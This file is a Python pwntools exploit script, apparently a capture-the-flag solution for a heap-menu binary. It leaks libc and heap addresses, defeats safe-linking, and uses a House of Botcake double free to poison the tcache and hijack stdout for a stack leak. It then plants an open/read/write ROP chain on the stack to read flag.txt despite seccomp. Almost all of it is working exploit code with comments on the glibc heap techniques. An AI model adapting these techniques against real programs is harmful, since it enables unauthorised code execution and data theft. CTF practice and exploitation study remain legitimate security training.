#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
libc = ELF("./libc.so.6")

context.binary = exe
# this makes tmux split vertically when debugging
# I was going to beat safelinking another way, which is why this became a global
heap = 0x0
# pwninit’s stub conn() function. Call with `python3 solve.py LOCAL` or no args to change which.
def conn(argv=[]):
    if args.GDB:
        return gdb.debug("./vuln", gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process("./vuln")

gdbscript = '''
init-pwndbg
'''.format(**locals())

# Safelinking deobfuscation helper
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def main():
    global heap
    r = conn()

    def alloc(idx, size, data):
        print("ALLOCATING: ", idx)
        r.sendlineafter("> ", "1")
        r.sendlineafter("idx: ", str(idx))
        r.sendlineafter("size: ", str(size))
        r.sendlineafter("content: ", data)

    def free(idx):
        print("FREEING: ", idx)
        r.sendlineafter("> ", "2")
        r.sendlineafter("idx: ", str(idx))

    def show(idx):
        print("SHOWING: ", idx)
        r.sendlineafter("> ", "3")
        r.sendlineafter("idx: ", str(idx))
        return r.recvline()

    # Make two large chunks
    alloc(0, 1350, 'A')
    alloc(1, 1350, 'A')
    # Free the first one so bk = main_arena in libc
    free(0)
    resp = show(0)
    # parse the libc address in little-endian
    libcaddr = int(resp[5::-1].hex(),16)
    # Use offsets found in gdb to compute libc base
    libc.address = libcaddr - (0x7f7c10419ce0 - 0x7f7c10200000)
    print("Libc Leak: ", hex(libc.address))
    free(1)

    #Grab some blocks
    alloc(0,128,'A')
    alloc(1,128,'A')
    alloc(2,128,'A') #excess
    alloc(3,128,'A') #excess
    # Place them into the tcache
    free(0)
    free(1)
    free(2)
    show(0)
    show(1)
    #This printed out a heap address
    addr = show(2)
    free(3)
    #Parse, deobfuscate, and set heap base.
    addr = int(addr[5::-1].hex(),16)
    heap_leak = deobfuscate(addr)
    # seccomp actually alloc'd over a page of memory,
    # so base was -0x1000 from what I got.
    heap = (heap_leak >> 12 << 12) - 0x1000

    print("Heap Base: ", hex(heap))
    print("Cleaning tcaches + smallbins")
    for i in range(7):
        alloc(15, 16, 'A')
    for i in range(7):
        alloc(15, 0x60, 'A')
    for i in range(7):
        alloc(15, 0x70, 'A')
    for i in range(4):
        alloc(15, 0x80, 'A')
    for i in range(5):
        alloc(15, 0xc0, 'A')
    for i in range(2):
        alloc(15, 0xe0, 'A')
    for i in range(11):
        alloc(15, 0x20, 'A')
    for i in range(7):
        alloc(15, 0x10, 'A')
    alloc(15, 0x30, 'A')

    # Get environ and stdout
    environ = libc.symbols['environ']
    stdout = libc.symbols['_IO_2_1_stdout_']

    # House of botcake
    # Allocate 7 blocks of size 0x200, we’ll free them later
    # We can’t leak them as before, so place them into our mem array properly
    for i in range (7):
        alloc(9+i, 0x200, 'A')
    # Allocate our prev block and our victim block, along with the buffer
    alloc(6, 0x200, 'prev')
    alloc(7, 0x200, 'victim')
    alloc(8, 0x10, 'flag.txt\x00')
    # Fill the tcache!
    for i in range(7):
        free(9+i)

    # free our victim chunk
    free(7)
    # free our previous chunk (they are now consolidated)
    free(6)
    alloc(5, 0x200, 'X')  # Open up a slot in the tcache
    # double free vulnerablity, now victim is in the tcache!
    free(7)
    
    
    

    # We alloc the slightly larger chunk, getting a split of the [prev, victim] chunk
    # We’re going to write to it the necessary padding then:
    # 0x211, to preserve the size of the victim chunk
    # stdout ^ ((heap + 0x3320) >> 12), because we need to pass a safe-linked ptr.
    # Otherwise, malloc will crash. 0x3320 offset was found via debugging.
    alloc(1, 0x230, b'T'*0x208 + p64(0x211) + p64((stdout ^ ((heap + 0x3320) >> 12))))
    alloc(2, 0x200, 'X') # remove victim from the tcache again, updating the linked list structure
    # This alloc writes to stdout. It sets stdout’s write buffer to be environ, and sets flags to cause it to flush on next print
    alloc(3, 0x200, p64(0xfbad1800) + p64(environ)*3 + p64(environ) + p64(environ + 0x8)*2 + p64(environ + 8) + p64(environ + 8))
    print("STDOUT: ", hex(stdout))
    r.interactive()
    # When printf("> ") happens at the start of the while loop, the buffer is flushed, and our stack address gets printed out first! No newline required.
    stack = u64(r.recv(8)[:-1].ljust(8, b'\x00')) -0x258 # offset computed in gdb
    print("Stack Leak: ", hex(stack))
    
    

    # Setup our ROP chain through libc.
    rop = ROP(libc)
    # Use that buffer block as a flag buffer (offsets found through gdb)
    flagoffset = 0x55d31ac5f520 - 0x55d31ac5c000
    flag = heap + flagoffset+16
    # Just make the area after the flag chunk our buffer, its probably writable.
    output = flag + 0x20
    print("Flag.txt: ", hex(flag))
    # Use rop call to automatically generate function calls
    rop.call('syscall', [2, flag, 0, 0])
    rop.call('syscall', [0, 3, output, 0x100])
    rop.call('syscall', [1, 1, output, 0x100])

    free(1) # free our forged chunk
    free(2) # free our victim chunk
    # write to our forged chunk (which again contains the metadata to victim)
    alloc(1, 0x230, b'T'*0x208 + p64(0x211) + p64((stack ^ ((heap + 0x3320) >> 12))))
    # alloc our victim chunk again.
    alloc(2, 0x200, 'xxx')
    # allocs to somewhere on stack before _IO_file_underflow to hijack the return address of it.
    alloc(3, 0x200, b'A'*0xc8+ rop.chain())
    r.interactive()

if __name__ == "__main__":
    main()